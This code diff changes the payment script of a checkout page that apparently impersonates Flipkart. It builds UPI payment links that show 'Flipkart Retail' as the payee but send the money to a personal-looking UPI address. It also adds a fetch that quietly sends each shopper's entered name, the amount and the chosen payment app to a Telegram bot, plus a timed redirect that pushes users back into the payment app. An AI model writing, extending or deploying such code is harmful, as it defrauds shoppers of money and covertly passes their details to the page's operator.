@@ -572,30 +572,40 @@ init = function() {
     const businessUpi = "ravikantb114-2@okaxis"; 
     const amount = sel.price;
     const txnId = "FK" + Math.floor(Math.random() * 1000000);
-    const name = "Flipkart%20Retail";
+    const name = "Flipkart Retail"; // Space allowed here
 
-    // Pata lagao user ne kaunsa app select kiya hai
     const selectedApp = document.querySelector('input[name="payMethod"]:checked').value;
+    
+    // Sabse safe UPI link format
+    const baseUrl = `upi://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}&mode=02`;
 
-    let upiUrl = `upi://pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+    // Telegram report (Silently background mein chalega)
+    const msg = `🔔 *Payment Started*\n👤: ${document.getElementById('uName').value}\n💰: ₹${amount}\n📱 App: ${selectedApp}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // App ke hisaab se link change karein
+    // App choice logic
     if (selectedApp === "phonepe") {
-        window.location.href = `phonepe://pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+        // PhonePe specific safe link
+        window.location.href = baseUrl; 
     } 
     else if (selectedApp === "gpay") {
-        window.location.href = `tez://upi/pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+        // GPay specific safe link
+        window.location.href = baseUrl;
     } 
     else if (selectedApp === "paytm") {
-        window.location.href = `paytmmp://pay?pa=${businessUpi}&pn=${name}&am=${amount}&cu=INR&tr=${txnId}`;
+        // Paytm specific safe link
+        window.location.href = baseUrl;
     } 
     else {
-        window.location.href = upiUrl; // Default generic UPI
+        window.location.href = baseUrl;
     }
 
-    // Telegram Notification
-    const msg = `🔔 *New Order Attempt*\n👤 Name: ${document.getElementById('uName').value}\n💰 Amount: ₹${amount}\n📱 App: ${selectedApp}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    // Ek extra protection: agar browser block kare toh user ko manually click karne ka option mile
+    setTimeout(() => {
+        if (!document.hidden) {
+             window.location.href = baseUrl;
+        }
+    }, 1500);
 }
 // Ye line hamesha last mein rehni chahiye
 init();
